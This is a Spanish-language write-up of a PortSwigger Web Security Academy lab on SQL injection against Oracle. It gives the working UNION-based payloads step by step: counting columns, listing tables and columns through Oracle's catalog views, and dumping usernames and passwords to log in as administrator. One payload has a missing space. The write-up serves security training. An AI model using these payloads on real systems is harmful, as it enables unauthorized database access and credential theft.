# SQL Injection - Listing Database Contents on Oracle

**Plataforma:** PortSwigger Web Security Academy
**Dificultad:** Practitioner
**Estado:** ✅ Resuelto
**Objetivo:** Determinar el nombre de la tabla que contiene usuarios y contraseñas, listar sus columnas y extraer las credenciales para iniciar sesión como `administrator`.

## Pasos

### 1. Confirmar inyección y número de columnas
- Añadí una comilla simple (`'`) al parámetro `category` y la aplicación devolvió un error 500.
- Usé `ORDER BY` para determinar el número de columnas:
' ORDER BY 1-- (sin error)
' ORDER BY 2-- (sin error)
' ORDER BY 3-- (error 500)
- **Conclusión:** La consulta devuelve **2 columnas**.

### 2. Confirmar columnas de texto
- En Oracle se necesita `FROM dual`. Probé: ' UNION SELECT 'abc', 'def' FROM dual--
- Ambos textos se reflejaron en la respuesta, así que ambas columnas aceptan texto.

### 3. Listar tablas de la base de datos
- Consulté la tabla `all_tables` de Oracle:' UNION SELECT table_name, NULL FROM all_tables--
- Encontré una tabla con el nombre: **`USERS_VQDOWF`** (sufijo aleatorio).

### 4. Listar columnas de la tabla de usuarios
- Usé `all_tab_columns` filtrando por el nombre de la tabla encontrada: ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_VQDOWF'--
- Encontré las columnas: **`USERNAME_EKABOC`** y **`PASSWORD_GNBNTN`** (sufijos aleatorios).

### 5. Extraer credenciales
- Volqué los datos de la tabla: ' UNION SELECTUSERNAME_EKABOC, PASSWORD_GNBNTN FROM USERS_VQDOWF--
- Obtuve las credenciales del usuario **`administrator`**.

### 6. Iniciar sesión
- Accedí a "My Account" con el usuario `administrator` y la contraseña extraída.
- **Lab resuelto.**

## Resultado
Acceso exitoso como `administrator`.

## Evidencia
<img width="1486" height="451" alt="image" src="https://github.com/user-attachments/assets/9cc94622-523f-4601-a043-3c59cda6ef81" />
